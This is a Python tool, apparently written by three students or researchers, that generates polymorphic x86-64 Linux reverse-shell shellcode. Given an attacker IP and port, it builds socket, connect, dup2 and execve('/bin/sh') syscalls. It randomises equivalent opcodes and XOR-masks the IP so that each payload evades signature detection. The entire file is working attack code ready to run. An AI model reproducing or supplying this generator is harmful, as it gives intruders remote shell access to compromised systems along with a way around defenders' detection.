#!/usr/bin/env python3
'''
Program : Reverse shell TCP polymorphic shellcode generator
Authors : Ander ARROSTEGUY, Matthieu BAILLY, Mohamed BOUHASTINE
'''

import random
import re
import sys
from socket import htons

############################################################

def header():
    print("Reverse shell polymorphic shellcode generator 1.0")
    print("Written by Ander, Matthieu & Mohamed\n")

############################################################

def usage():
    print("Usage : %s <IP> <PORT> [<SIZE_LIMIT>]" % (sys.argv[0].split('/')[-1]))

############################################################

def ip_to_opcode(ip):
    ip_digits = list(reversed(ip.split(".")))
    ip_hexa = "0x"
    for ip_digit in ip_digits:
        ip_hexa += "%.2x" % int(ip_digit)

    to_asm = iter("%.2x" % (int("%d" % int(ip_hexa, 16)) ^ int("%d" % 0xdeadbeef)))
    return ' '.join(list(reversed(' '.join(
        x + y for x, y in zip(
            to_asm,
            to_asm
        )
    ).split(" "))))

############################################################

def port_to_opcode(port):
    port_chars = iter("%.2x" % (htons(port)))
    return ' '.join(list(reversed(' '.join(
        x + y for x, y in zip(
            port_chars,
            port_chars
        )
    ).split(" "))))

############################################################

# return syscall opcode
def syscall():
    return "0f 05"

############################################################

# xor les registres xor reg, reg | xor r8, r8 ; mov reg, r8
def clean_register(register):
    if (register == 'rax'):
        opcodes = ["48 31 c0", "4d 31 c0 4c 89 c0"]
        return opcodes[random.randint(0, len(opcodes) - 1)] + ' '

    elif (register == 'rbx'):
        opcodes = ["48 31 db", "4d 31 c0 4c 89 c3"]
        return opcodes[random.randint(0, len(opcodes) - 1)] + ' '

    elif (register == 'rcx'):
        opcodes = ["48 31 c9", "4d 31 c0 4c 89 c1"]
        return opcodes[random.randint(0, len(opcodes) - 1)] + ' '

    elif (register == 'rdx'):
        opcodes = ["48 31 d2", "4d 31 c0 4c 89 c2"]
        return opcodes[random.randint(0, len(opcodes) - 1)] + ' '

    elif (register == 'rsi'):
        opcodes = ["48 31 f6", "4d 31 c0 4c 89 c6"]
        return opcodes[random.randint(0, len(opcodes) - 1)] + ' '

    elif (register == 'rdi'):
        opcodes = ["48 31 ff", "4d 31 c0 4c 89 c7"]
        return opcodes[random.randint(0, len(opcodes) - 1)] + ' '

    else:
        return 0

############################################################

# sys_socket 
def socket():
    opcodes = ""
    opcodes_socket = [
        ["b0 29", "b0 28 04 01"],               # mov al, 41
        ["40 b7 02", "40 b7 01 40 80 c7 01"],   # mov dil, 2
        ["40 b6 01", "40 b6 02 40 80 ee 01"]    # mov sil, 1
    ]

    for i in range(0, len(opcodes_socket)):
        opcodes += "%s " % (opcodes_socket[i][random.randint(0, len(opcodes_socket[i]) - 1)])

    opcodes += "%s " % syscall()
    return opcodes

############################################################

# sys_connect
def connect(ip, port):
    ip_opcodes = ip_to_opcode(ip)
    port_opcodes = port_to_opcode(port)
    opcodes = ""
    opcodes_connect = [
        ["49 89 c7", "4d 31 c0 49 89 c0 4d 89 c7"],  # mov r15, rax
        ["48 89 c7", "4d 31 c0 49 89 c0 4c 89 c7"],  # mov rdi, rax
        [clean_register('rax').rstrip()],  # xor rax, rax
        ["b0 2a", "b0 29 04 01"],  # mov al, 42
        ["53"],  # push rbx
        ["be %s" % ip_opcodes],  # mov esi, 0xdfadbe90
        ["81 f6 ef be ad de"],  # xor esi, 0xdeadbeef
        ["66 68 %s" % port_opcodes],  # push word 7459 = 23 1d - 0x1d23 = 8989
        ["66 6a 02"],  # push word 2
        ["48 89 e6", "4d 31 c0 49 89 e0 4c 89 c6"],  # mov rsi, rsp
        ["b2 18", "4d 31 c0 41 b0 18 44 88 c2"]  # mov dl, 24
    ]

    for i in range(0, len(opcodes_connect)):
        opcodes += "%s " % (opcodes_connect[i][random.randint(0, len(opcodes_connect[i]) - 1)])

    opcodes += "%s " % syscall()
    return opcodes

############################################################

# dup2(3, 0) ; dup2(3, 1) ; dup2(3, 2)
def dup2x3():
    opcodes = ""
    opcodes_dup20 = [
        [clean_register('rax').rstrip()],  # xor rax, rax
        [clean_register('rdx').rstrip()],  # xor rdx, rdx
        ["b0 21", "b0 20 04 01"],  # mov al, 33
        ["4c 89 ff", "4d 31 c0 4d 89 f8 4c 89 c7"],  # mov rdi, r15
        [clean_register('rsi').rstrip()]  # xor rsi, rsi
    ]

    for i in range(0, len(opcodes_dup20)):
        opcodes += "%s " % (opcodes_dup20[i][random.randint(0, len(opcodes_dup20[i]) - 1)])

    opcodes += "%s " % syscall()

    opcodes_dup21 = [
        [clean_register('rax').rstrip()],  # xor rax, rax
        [clean_register('rdx').rstrip()],  # xor rdx, rdx
        ["b0 21", "b0 20 04 01"],  # mov al, 33
        ["4c 89 ff", "4d 31 c0 4d 89 f8 4c 89 c7"],  # mov rdi, r15
        [clean_register('rsi').rstrip()],  # xor rsi, rsi
        ["40 b6 01", "4d 31 c0 41 b0 01 44 88 c6"]  # mov sil, 1
    ]

    for i in range(0, len(opcodes_dup21)):
        opcodes += "%s " % (opcodes_dup21[i][random.randint(0, len(opcodes_dup21[i]) - 1)])

    opcodes += "%s " % syscall()

    opcodes_dup22 = [
        [clean_register('rax').rstrip()],  # xor rax, rax
        [clean_register('rdx').rstrip()],  # xor rdx, rdx
        ["b0 21", "b0 20 04 01"],  # mov al, 33
        ["4c 89 ff", "4d 31 c0 4d 89 f8 4c 89 c7"],  # mov rdi, r15
        [clean_register('rsi').rstrip()],  # xor rsi, rsi
        ["40 b6 02", "4d 31 c0 41 b0 02 44 88 c6"]  # mov sil, 2
    ]

    for i in range(0, len(opcodes_dup22)):
        opcodes += "%s " % (opcodes_dup22[i][random.randint(0, len(opcodes_dup22[i]) - 1)])

    opcodes += "%s " % syscall()
    return opcodes

############################################################

# sys_execve("/bin/sh")
def gimme_shell():
    opcodes = ""
    opcodes_execve = [
        [clean_register('rax').rstrip()],  # xor rax, rax
        [clean_register('rdx').rstrip()],  # xor rdx, rdx
        ["48 bb 2f 2f 62 69 6e 2f 73 68", "4d 31 c0 49 b8 2f 2f 62 69 6e 2f 73 68 4c 89 c3"],  # mov rbx, 0x68732f6e69622f2f
        ["50"],  # push rax
        ["53"],  # push rbx
        ["48 89 e7", "4d 31 c0 49 89 e0 4c 89 c7"],  # mov rdi, rsp
        ["50"],  # push rax
        ["57"],  # push rdi
        ["48 89 e6", "4d 31 c0 49 89 e0 4c 89 c6"],  # mov rsi, rsp
        ["b0 3b", "b0 3c 2c 01"]  # mov al, 0x3b
    ]

    for i in range(0, len(opcodes_execve)):
        opcodes += "%s " % (opcodes_execve[i][random.randint(0, len(opcodes_execve[i]) - 1)])

    opcodes += "%s " % syscall()
    return opcodes

############################################################

def generate_shellcode(ip, port):
    opcodes = clean_register("rax")
    opcodes += clean_register('rbx')
    opcodes += clean_register('rcx')
    opcodes += clean_register('rdx')
    opcodes += clean_register('rsi')
    opcodes += clean_register('rdi')
    opcodes += socket()
    opcodes += connect(ip, port)
    opcodes += dup2x3()
    opcodes += gimme_shell()

    opcodes = re.findall("[a-f0-9]{2} ", opcodes)
    shellcode = ""

    for opcode in opcodes:
        shellcode = shellcode + "\\x" + opcode.rstrip()

    return shellcode, len(opcodes)

def main(ip, port, size_limit = None):
    print("[.] generating shellcode...")
    if (size_limit != None):
        while True:
            shellcode, length = generate_shellcode(ip, port)
            if (length <= size_limit):
                break
    else:
        shellcode, length = generate_shellcode(ip, port)
    
    print("[+] %d bytes shellcode generated for %s:%d\n\n%s" % (length, ip, port, str(shellcode)))

############################################################

if (__name__ == "__main__"):
    header()

    if (len(sys.argv[1:]) < 2):
        print("[-] illegal parameters number.")
        usage()
        exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])

    if (len(re.findall("^[0-9]{,3}\.[0-9]{,3}\.[0-9]{,3}\.[0-9]{,3}$", ip)) != 1):
        print("[-] given IP is not IPv4.")
        usage()
        exit(2)

    if (port < 1 or port > 65535):
        print("[-] port number must be between 1 and 65535")
        usage()
        exit(3)

    size_limit = int(sys.argv[3]) if (len(sys.argv[3:]) == 1) else None

    main(ip, port, size_limit)
